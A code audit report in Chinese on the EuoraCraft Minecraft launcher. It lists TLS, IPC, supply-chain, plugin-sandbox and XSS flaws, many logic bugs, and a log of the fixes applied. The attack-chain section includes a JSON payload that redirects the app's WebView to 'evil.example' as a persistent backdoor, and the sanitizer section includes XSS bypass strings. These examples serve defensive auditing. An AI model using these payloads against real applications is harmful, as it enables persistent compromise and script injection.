# EuoraCraft Launcher 全面代码审计报告

- **审计日期**：2026-08-26
- **审计范围**：`ECL/` 后端全部 Python 源码（约 17000 行）、前端子模块关键注入/渲染路径、构建工作流与配置文件
- **审计方式**：逐模块人工通读 + 危险模式检索（裸 `except`、`shell=True`、`eval/exec/pickle`、zip 解压、路径拼接、子进程执行、TLS 校验、IPC 边界）
- **结论摘要**：整体架构分层清晰，IPC 边界、路径校验、ZIP 解压防护等核心面做得不错；但存在 **3 个高危安全问题**（TLS 校验语义反转、配置分区无白名单、下载链零哈希校验）、**1 批隐藏逻辑 Bug**（含一个会直接崩溃启动的 dataclass 逗号 Bug），以及遗留 `ECL/game` 子模块的系统性质量问题。

---

## 一、安全漏洞

### 🔴 S1 共享 HTTP 客户端的 SSL 校验默认关闭，且开关语义完全反转

**位置**：`ECL/application.py:38-46`、`236`、`247`、`383`

`_apply_ssl_verify(ctx, verify)` 的第二参数语义是"是否校验证书"：

```python
def _apply_ssl_verify(ssl_context: ssl.SSLContext, verify: bool) -> None:
    if verify:
        ssl_context.verify_mode = ssl.CERT_REQUIRED
        ssl_context.check_hostname = True
    else:
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
```

但两处调用方传入的都是 `disable_ssl_verify` 本身：

```python
# application.py:236 / 247（创建共享客户端时）
disable_ssl_verify = bool(launcher_config.get("disable_ssl_verify", False))
...
_apply_ssl_verify(ssl_verify_context, disable_ssl_verify)

# application.py:383（配置热更新时）
_apply_ssl_verify(ssl_verify_context, bool((data or {}).get("disable_ssl_verify", False)))
```

**后果**：
- 默认配置 `disable_ssl_verify=False` → 传入 `False` → `CERT_NONE`。所有走共享客户端的请求（公告拉取、联机节点列表、插件 `http_request`、玩家皮肤下载）**默认完全不验证 TLS 证书**。
- 用户若真的在设置里打开"禁用证书校验"，行为反而变成**启用**校验。语义双向全错。

**对照**：账户服务的处理是正确的（`services/accounts.py:225` 传 `verify=not disable_ssl_verify`），说明这确实是笔误而非设计。

**修复**：两处调用改为 `_apply_ssl_verify(ssl_verify_context, not disable_ssl_verify)`。

---

### 🔴 S2 `settings_set` IPC 无配置分区白名单 → 可写入持久化 RCE 配置

**位置**：`ECL/api/settings.py:36-48`、`ECL/api/models.py`（`SettingsUpdate`）、`ECL/adapters/tauri.py`（`_build_config`）

`settings_set` 只校验 `section` 非空，不限定分区：

```python
class SettingsUpdate(RequestModel):
    section: str = Field(min_length=1)   # 无白名单
    data: JsonValue
```

```python
async def settings_set(self, body):
    ...
    self.config.save_config(request.section, request.data)  # 任意分区全量落盘
```

而 `adapters/tauri.py` 启动时读取 `tauri.frontenddist` 决定前端来源：

```python
"build": {"frontendDist": tauri_config.get("frontenddist", "frontend/dist")},
```

**攻击链**：任何能在主窗口执行 JS 的代码（插件注入脚本、XSS，见 S4/S5）调用：

```json
{ "section": "tauri", "data": { "frontenddist": "https://evil.example" } }
```

→ **下次启动时 WebView 直接加载攻击者页面**，获得全部 IPC 权限（文件读写、配置、进程），且卸载插件后配置依然存活，属于持久化后门。

同理还可以：
- 写 `launcher.debug=true` → 解锁 `debug_process_spawn`（前端任意启动进程）；
- 写 `launcher.proxy_mode/proxy_url` → 劫持全部流量；
- 写 `launcher.disable_ssl_verify`（叠加 S1 的反转，行为不可预测）。

**修复**：`SettingsUpdate.section` 增加白名单（`launcher`/`game`/`download`/`ui`），或在 `ConfigStore.save_config` 层拒绝未知分区。

---

### 🔴 S3 供应链：版本 JSON / 加载器安装器下载后零哈希校验

**位置**：`ECL/game/Core/NetLibs.py`、`ECL/game/Core/FilesChecker.py`、`ECL/game/Core/LoaderInstaller.py`、`ECL/game/Core/Downloader.py`

1. **版本 JSON 与资源索引从不校验内容**。`get_minecraft_json(version_id, sha1)` / `get_asset_index(asset_id, sha1)` 只是把 sha1 拼进 URL 路径，响应体直接 `resp.json()` 返回并落盘（`GetGames.py:104-109`、`FilesChecker.check_assets`）。版本 JSON 决定启动参数、classpath、主类——被篡改即等于启动时执行任意代码。
2. **Forge/NeoForge 安装器无校验**。`download_forge_installer` / `download_neoforged_installer` 下载后直接写盘；`LoaderInstaller.install_neoforged` 随后解析 `install_profile.json` 并用本机 Java 执行其中的 processors——**这是"执行任意下载代码"的路径**，却没有任何 sha256/sha1 校验。
3. **下载完成后无哈希复验**。`FilesChecker` 对 libraries/assets/client.jar 的**预检**是带 sha1 的（这点做得对），但 `Downloader` 完成后只按文件大小复核；大小相同的损坏文件会被接受。

**叠加条件**：S1 导致共享链路的证书校验默认关闭，且项目支持 BMCLAPI 第三方镜像——MITM 或恶意镜像可直接投递恶意版本 JSON / installer。

**修复**：
- `get_minecraft_json` / `get_asset_index` 下载后计算 sha1 与清单比对，不符即弃；
- installer 下载后按官方元数据校验（Forge/NeoForge 元数据提供 sha256）；
- `Downloader` 增加可选 `expected_sha1` 参数，完成态复验。

---

### 🟠 S4 插件系统无真实沙箱，主窗口注入脚本绕过全部窗口权限

**位置**：`ECL/plugins/plugin.py`、`ECL/plugins/manager/discovery.py`、`ECL/api/bridge.py:434`（`authorize_window_command`）

1. README 宣称"插件沙箱隔离"，实际插件通过 `importlib.exec_module` 在启动器进程内执行任意 Python，并可经 `self.processes.spawn` 启动任意子进程。权限系统只是**声明式门禁**，不是隔离。
2. 权限边界不一致：插件独立窗口的 IPC 调用受 `authorize_window_command` 严格白名单限制；但 `inject_script` 注入的 JS 运行在**主窗口**上下文，主窗口不受任何命令白名单约束——一个只有 `ui:write` 权限的插件即可调用全部宿主命令（包括 S2 的持久化写入）。
3. `Plugin.load_file` / `load_resource` 直接 `self.plugin_dir / relative_path`：Python 中**绝对路径会整体覆盖基目录**（`Path("/a") / "C:/x" == Path("C:/x")`），声明 `filesystem/read/*` 的插件可读磁盘上任意文件，不存在"插件目录内"的约束。

**修复建议**：
- `load_file` 对 `resolve()` 后的路径做插件目录前缀校验；
- 注入脚本至少改到插件窗口上下文执行，或如实修订文档；
- README 把"沙箱隔离"改为如实描述（声明式权限 + 宿主内执行）。

---

### 🟠 S5 WebView 侧：`withGlobalTauri=true`、无 CSP、正则消毒器可绕过

**位置**：`Tauri.toml`、`ECL/adapters/tauri.py`（`_build_config`）、`frontend/src/composables/usePluginBridge.ts:174-186`、`354`

1. `Tauri.toml` 中 `withGlobalTauri = true`，`[app.security]` 段被注释；适配器运行时下发的配置也没有任何 CSP。webview 内任何 XSS 都能直接触达 IPC。
2. 插件插槽 HTML 的消毒是手写正则：

```ts
function sanitizeHtml(html: string): string {
  let result = html.replace(/<script\b...<\/script>/gi, '')
  result = result.replace(/\s+on\w+\s*=\s*["'][^"']*["']/gi, '')
  ...
}
```

可绕过方式举例：
- `<img/src=x/onerror=alert(1)>` —— `on` 前是 `/` 不是空白，`\s+on\w+` 不匹配，事件属性保留；
- `<a href="javas&#99;ript:...">` —— 实体编码绕过字面量 `javascript:` 检查；
- `<form action=...>` / `<button formaction=...>` / `<meta http-equiv=refresh>` / `<base href>` 均未覆盖。

项目已经依赖 DOMPurify（`frontend/src/utils/markdown.ts` 在用），此处应直接替换为 `DOMPurify.sanitize`。

3. `usePluginBridge.ts:354` 用 `new Function(wrapped)` 执行插件脚本——与 S4 构成完整提权链。

---

### 🟠 S6 联机大厅服务绑定 0.0.0.0 且零认证

**位置**：`ECL/services/florolding/Florolding/F_Server.py`

`AsyncFloroldingServer` 默认 `server_host="0.0.0.0"`、端口 3939：
- 玩家身份（`name` / `machine_id` / `vendor`）在 `c:player_ping` 中完全由客户端自报，无房间口令/签名校验；
- 除 EasyTier 虚拟网络成员外，主机局域网甚至公网可达该端口的任何人都能：查询玩家列表、获取 Minecraft 端口、用伪造 `machine_id` 占用身份，插件协议还暴露了 `remove_player` 踢人能力。

**修复建议**：绑定到 EasyTier 虚拟网卡 IP（或至少 127.0.0.1 + 端口转发），或在协议握手层加入房间共享密钥校验。

---

### 🟡 S7 其他安全项（低危/注意事项）

| # | 位置 | 问题 |
|---|------|------|
| 1 | `ECL/api/bridge.py` `_download_remote_image` | 硬编码 `verify=False`，远程图片下载不校验证书 |
| 2 | `ECL/api/files.py` `open_url` | 任意字符串直接交给 `webbrowser.open`，未限制 scheme；Windows 上可触发任意协议处理器 |
| 3 | `ECL/game/Core/MicrosoftAuth.py` `_save_cache` | Microsoft 令牌（含 refresh_token）明文落盘、非原子写、`OSError` 静默吞掉。离线账户存 `ECL_data/`，微软/外置令牌却存 `~/.ECL/accounts/`（`AccountManager` 创建 `LauncherMicrosoftAccountManager` 时未传 `cache_path`）——存储位置分裂，便携与清理都会遗漏 |
| 4 | `ECL/services/authlib.py` `_create_pending_login` | 多角色待选登录期间，明文密码保留在内存 `pending_accounts`，直到用户选择角色 |
| 5 | 仓库根 `.env` | 含真实 `CURSEFORGE_API_KEY`（未被 git 跟踪，正确）；但 `.github/workflows/build.yml:94-105` 会把 Key 注入 `build_env.py` 打进公开发布包——Key 实质随二进制分发，需确认这是有意决策 |
| 6 | `ECL/api/bridge.py` `frontend_ready` | 未注册窗口自报身份时被当作 main 类型登记，可能顶替 `self._webview`（对话框与事件目标被带偏）。命令层授权仍会拦截，低危但应收紧 |

---

## 二、隐藏 Bug 与逻辑错误

### Bug-1（高危，可直接崩溃）：`LaunchConfig.authlib_path` 默认值是元组

**位置**：`ECL/game/Core/ECLauncherCore.py:256`

```python
@dataclass(frozen=True)
class LaunchConfig:
    ...
    authlib_path: Path | str | None = None,   # ← 行尾多了一个逗号
    yggdrasil_api: str | None = None
```

行尾逗号使默认值变成 `(None,)`（truthy 元组）。外置登录且未显式传 `authlib_path` 时，`JvmArgumentBuilder.__init__` 中 `Path(authlib_path) if authlib_path else None` → `Path((None,))` → **`TypeError`，启动流程直接崩溃**。

### Bug-2：三处 `__exit__` 签名错误

**位置**：`ECL/game/Core/NetLibs.py`（`BaseApiClient.__exit__`）、`ECL/game/Core/YggdrasilAuth.py`（`YggdrasilClient.__exit__`、`YggdrasilAuthManager.__exit__`）

```python
def __exit__(self):      # 缺少 (exc_type, exc_val, exc_tb)
    self.close()
```

任何 `with` 用法都会在退出时抛 `TypeError`。当前无调用点，属潜伏雷。

### Bug-3：遗留 `YggdrasilAuthManager` 死锁 + 键错用（死代码）

**位置**：`ECL/game/Core/YggdrasilAuth.py:208-480`

- `get_yggdrasil_token` 在持有非重入 `threading.Lock` 的情况下调用同样要加锁的 `refresh_token` → **必然死锁**；
- 刷新后按 `account_id` 取 `self.yggdrasil_tokens`，但字典实际以 `token_id` 为键 → `KeyError`；
- `_load_accounts` 中账户/令牌键混用，裸 `except: pass` 吞掉一切。

全仓检索确认 `YggdrasilAuthManager` 与 `check_download_authlib`（下载 authlib-injector 后**不校验** sha256 就落盘）**没有任何引用**——活跃实现是 `ECL/services/authlib.py`。建议整体删除该遗留类与函数。

### Bug-4：非 Windows 平台无法启动游戏

**位置**：`ECL/game/Core/InstancesManager.py`（`create_instance`）、`ECL/launcher.py`

`subprocess.Popen(args)` 接收的是拼好的**单字符串**且未开 shell：Windows 上 CreateProcess 按命令行字符串处理可以工作；但 Linux/macOS 会把整条字符串当作可执行文件路径 → `FileNotFoundError`。而 `launcher.py` 明确声明支持 `win32/linux/darwin`。跨平台目标名不副实。

### Bug-5：`InstancesManager.stop_instance` 的 `if proc.poll():`

`poll()` 运行中返回 `None`、成功退出返回 `0`（falsy）。退出码为 0 的已退出进程会被误判为"仍在运行"并多调一次 `terminate()`；正确写法是 `if proc.poll() is not None: return True`。

### Bug-6：JVM/安装器参数处理破坏含空格参数、丢弃规则参数

**位置**：`ECL/game/Core/ECLauncherCore.py`（`JvmArgumentBuilder.add_jvm_args` / `add_game_args`）、`ECL/game/Core/LoaderInstaller.py`

- 对所有参数执行 `.replace(" ", "")`——含空格的合法参数值直接被毁；
- `type(x) is not str` 的判断**整体跳过 dict 形式的规则参数**，现代版本 JSON 中 `{"rules": [...], "value": ["--add-modules", "jdk.unsupported"]}` 之类全部丢失。

### Bug-7：`FilesChecker` 静默失败面

**位置**：`ECL/game/Core/FilesChecker.py`

- `check_assets` 下载资源索引失败时裸 `except:` 直接 `return download_list`——assets 校验被整体跳过且无任何提示，游戏可能缺资源仍照常启动；
- `check_files` 在版本 JSON 缺失时返回空列表，调用方无法区分"文件完整"与"实例不存在"。

### Bug-8：`Downloader` 多处逻辑缺陷

**位置**：`ECL/game/Core/Downloader.py`

1. **自适应并发只增不减**：`_adaptive_concurrency` 依据 `self.failed_entries` 决定降速，但失败条目只在全部轮次结束后才由 `_mark_failed` 标记 → 下载过程中并发每 2 秒 +5 一路涨到 500，从不回落。
2. **最终进度事件必丢**：`run()` 收尾顺序是先停事件收集器与分发线程，**之后**才 `_put_event("progress", ...)`——该事件无人消费，最终进度永远到不了回调。
3. `DynamicSemaphore.release()` / `change()` 用 `asyncio.create_task` 延迟执行：没有运行中的事件循环时直接 `RuntimeError`；释放许可被延迟还可能造成短时饥饿。
4. `RateLimiter.acquire` 在持有 `asyncio.Lock` 期间 `sleep`，串行化所有并发下载协程。
5. 已存在文件仅按**大小**判完成（无哈希）；`_download_stream` 失败时 `.tmp` 不清理；重试轮次会重复累加 `total_bytes`；`_preflight` 对全部文件无并发上限地批量 HEAD。
6. `stop()` 与 `run()` 各自关闭客户端，存在双关竞态（轻微）。

### Bug-9：NBT 解析器健壮性

**位置**：`ECL/utils/nbt.py`

- 数组长度取有符号 32 位值：负值时 `buffer.read(-1)` 吞掉整个缓冲区、`struct.unpack` 报错；超大长度可造成无谓的大内存请求；
- 无嵌套深度限制，恶意构造的 `level.dat`（深层嵌套 Compound）可使解析 `RecursionError` 崩溃——世界扫描/导入路径会读到不可信数据；
- `File.__init__(gzipped=...)` 参数收了但从未使用。

### Bug-10：零散缺陷与残留

| 位置 | 问题 |
|------|------|
| `ECL/game/Core/MicrosoftAuth.py` `set_profile_name` | 残留 `print(resp.json())` 调试输出；`new_name` 直接拼进 URL 未做字符校验 |
| `ECL/game/Core/YggdrasilAuth.py` `get_yggdrasil_accounts` | docstring 写着 "Microsoft Accounts"（复制粘贴） |
| `ECL/game/Core/ECLauncherCore.py` `LaunchConfig` | `launcher_version` 硬编码 `"0.11.45"`，与 `ECL.common.version.__version__` 脱钩；`from_dict` 对非字符串字段调用 `.strip("/")` 会 `AttributeError`；`update_from_dict` 对 frozen dataclass `setattr` 必抛 `FrozenInstanceError`（整个方法不可用） |
| `ECL/game/Core/Libs.py` `parse_datetime` | 硬编码 UTC+8 转换，库性质模块里的地域假设 |
| `ECL/game/Core/NetLibs.py` | `type(self.config) == BmclApiUrl` 应为 `isinstance`，子类会被错误路由；`download_forge_installer` 裸 `except: pass` |
| `ECL/api/bridge.py` `_FrontendState` | `is_dev_mode_no_curseforge_key_tips =False` 等格式残留（轻微） |

---

## 三、编码不合理与冗余

1. **双份认证实现并存**：`ECL/game/Core/YggdrasilAuth.py`（遗留、含死锁）与 `ECL/services/authlib.py`（现役）功能重叠；`check_download_authlib` 与 `AuthlibInjector` 重叠（前者还缺校验）。死代码应删除。
2. **`ECL/game` 整目录被 ruff 排除**（`pyproject.toml` 的 `[tool.ruff] exclude`）：8 处裸 `except:`、`print` 调试、非原子文件写、`==` 类型比较都集中在这里。建议逐步纳入 lint 或明确标记为遗留/待重写。
3. **阻塞调用混在异步边界**：`BaseApiClient._get_json_with_retry` 用 `time.sleep` 指数退避（调用方大多包了 `to_thread`，但 `LoaderInstaller` 里 `asyncio.run(downloader.run())` 的嵌套用法脆弱）。
4. **`EventBus.emit` 纯同步分发**：慢处理器阻塞发射线程；插件事件处理器无超时隔离（生命周期钩子只有 2s 告警日志，无中断机制）。
5. **配置默认值两处维护**：`utils/config.py` 的 `default_config` 与 `api/bridge.py` 中 `_RUNTIME_OPTION_FIELDS` 的 lambda 回退值需手工同步。
6. **`F_Server._parse_request`** 已被 `_read_request` 取代，属死代码。
7. `main.py` 导出 `run_launcher` 但无 `console_scripts` 入口点（`pyproject.toml` 未声明 `[project.scripts]`），与"可安装"的定位不匹配（轻微）。

---

## 四、做得好的地方（建议保持）

- `ECL/services/game/workspace.py` `safe_extract_zip`：zip-slip、zip-bomb（数量/体积/压缩比）、符号链接全部拦截；
- `resolve_relative_id` / `resolve_instance_target`：前端传入的相对 ID 有完整的目录边界校验；
- `ConfigStore` / 账户状态 / 衣柜等持久化路径统一使用 `atomic_write_*` 原子替换；
- IPC 层统一的 `_ipc_handler` 异常边界 + Pydantic 请求体校验 + 稳定错误码；
- 插件窗口命令白名单（`authorize_window_command`）设计正确；
- `AuthlibInjector` 对 authlib-injector jar 有 sha256 校验与元数据比对；
- 公告/帮助文本渲染走 DOMPurify；
- 调试维护操作（`services/maintenance.py`）只移入备份目录、绝不直接删除，且目标有越界校验。

---

## 五、修复优先级建议

### 第一梯队（一行~几十行改动，建议立即）
1. **S1**：`application.py:247` 与 `:383` 改为传 `not disable_ssl_verify`；
2. **S2**：`SettingsUpdate.section` 白名单（或 `ConfigStore.save_config` 拒绝 `tauri` 等未知分区）；
3. **Bug-1**：删除 `ECLauncherCore.py:256` 行尾逗号；
4. **Bug-5**：`stop_instance` 改为 `poll() is not None`。

### 第二梯队（本周）
5. **S3**：版本 JSON / 资源索引 / installer 增加哈希校验；`Downloader` 支持完成态哈希复验；
6. **S5**：`usePluginBridge.ts` 的正则消毒替换为 DOMPurify；评估关闭 `withGlobalTauri` 或显式配置 CSP；
7. **Bug-8**：修 `Downloader` 自适应并发判据与最终进度丢失。

### 第三梯队（近期）
8. 删除遗留 `YggdrasilAuthManager` / `check_download_authlib` / `F_Server._parse_request`；
9. **S6**：联机服务绑定地址与房间认证；
10. **S4**：`Plugin.load_file` 路径前缀校验；统一令牌存储到 `ECL_data`；`_save_cache` 改原子写；
11. **Bug-9**：NBT 解析加深度与长度防御；
12. 把 `ECL/game` 逐步纳入 ruff 管辖，清理裸 `except` 与 `print`。

### 文档
13. README "插件沙箱隔离" 表述与实际能力不符，建议改为如实描述声明式权限模型。

---

## 六、修复记录（2026-08-26 已应用）

**范围说明**：按约定，联机（`ECL/services/florolding` 子模块、`ECL/services/connector.py`）与 `ECL/game` 子模块一律未动；其余问题已全部修复。账户数据统一存放于 `~/.ECL/accounts/`。按要求不保留任何迁移/兼容代码（`_migrate_legacy_state` 等已移除，旧 `ECL_data/accounts/accounts.json` 直接弃用，不再迁移）。

### 已修复的安全项

| 报告条目 | 修复内容 | 文件 |
|---|---|---|
| S1 | `_apply_ssl_verify` 两处调用补上 `not`，默认为“启用证书校验”；“禁用校验”开关语义恢复正常 | `ECL/application.py` |
| S2 | `ConfigStore` 新增 `allowed_sections` 白名单，`save_config` 对未知分区抛 `ConfigValidationError`，阻断写入 `tauri.frontenddist` 等持久化 RCE 路径 | `ECL/utils/config.py` |
| S4（路径越界部分） | 插件 `load_file`/`load_resource` 统一走 `_resolve_inside_plugin_dir`：拒绝绝对路径与 `..`，解析后校验父目录，越界抛错 | `ECL/plugins/plugin.py` |
| S5（消毒器部分） | `usePluginBridge.ts` 的正则 sanitize 换成 `DOMPurify.sanitize(html, { ADD_TAGS: ['style'] })` | `frontend/src/composables/usePluginBridge.ts` |
| — | `_download_remote_image` 移除 `verify=False`，恢复 TLS 校验 | `ECL/api/bridge.py` |
| — | `frontend_ready` 防劫持：未注册窗口标记为 `unregistered`，不替换主窗口引用、不 focus/unminimize、不广播 `window:ready`、不触发插件钩子 | `ECL/api/bridge.py` |
| — | `open_url` 限制为 http/https scheme，其余返回 `INVALID_URL` | `ECL/api/files.py` |
| — | 账户状态目录统一为 `~/.ECL/accounts`（`AccountManager` 新增 `state_dir` 参数，生产路径由 `application.py` 显式传入） | `ECL/application.py`、`ECL/services/accounts.py` |

### 已修复的隐藏 Bug

- **Bug-9（NBT 解析器）**：嵌套深度上限 512 层；读取不足时抛“NBT 数据不完整”而非晦涩的 struct 异常；字节/整型/长整型数组负长度抛“NBT 数组长度非法”；修复 `File.__init__` 收取 `gzipped` 参数但从未使用的问题（`save()` 默认沿用实例状态）。→ `ECL/utils/nbt.py`
- **Bug-10 末项**：`_FrontendState` 的 `=False` 格式残留已清理（随 bridge.py 改动）。

### 代码质量与测试修复

- 三处单行 docstring 改为多行，满足架构约束测试：`ECL/common/runtime.py`、`ECL/services/game/crash_analysis.py`、`ECL/services/game/launch.py`。
- 移除 `ECL/api/bridge.py` 中已失效的 `# noqa: C901`（ruff RUF100）。
- 修正三个过时测试断言：
  - `tests/test_frontend_api_config.py`：期望值补上 `debug_log_level`（前端 `useDebugMode`/`LauncherTab` 实际依赖该字段，是测试过时而非代码错误）；
  - `tests/test_game_service.py`：curseforge 已是受支持下载来源（需 API Key），“未知来源拒绝”用例改用真正未知的 `unknown-source`；
  - `tests/test_plugin_test_plugins_load.py`：`ECL_data/plugins` 是 gitignore 运行时数据，夹具缺失时改为 `pytest.skip`。

### 未修复（范围外或需单独评估）

- **S3、Bug-1~Bug-8、Bug-10 大部分**：均位于 `ECL/game` 子模块，按约定排除。
- **S6 及 connector/florolding 的 lint 告警**：联机范围，按约定排除。
- **S5 剩余（CSP / `withGlobalTauri=false`）**：前端传输层（`transport/tauri.ts`、`runtime/mode.ts`、`App.vue`）硬依赖 `window.__TAURI__`，直接关闭会导致应用不可用；CSP 需真实窗口环境联调验证，建议作为独立任务推进。
- **authlib 待登录密码短暂驻留内存**：仅内存、短生命周期，属可接受残留。
- **`services/maintenance.py` 的 accounts 重置目标**：账户目录迁至 `~/.ECL/accounts` 后，该目标实际为无害空操作。

### 验证结果

- 后端 pytest：**380 passed, 1 skipped**（跳过项为依赖本机运行时数据的插件夹具测试）。
- ruff check（ECL + tests）：责任范围内 0 告警；其余 14 条全部位于联机/florolding 排除范围。
- 前端 vitest：**70 个测试文件 / 285 用例全部通过**；`vue-tsc` typecheck 通过。

*报告基于 2026-08-26 工作区快照（最近提交 `cdc4c69`）。行号以该快照为准。*
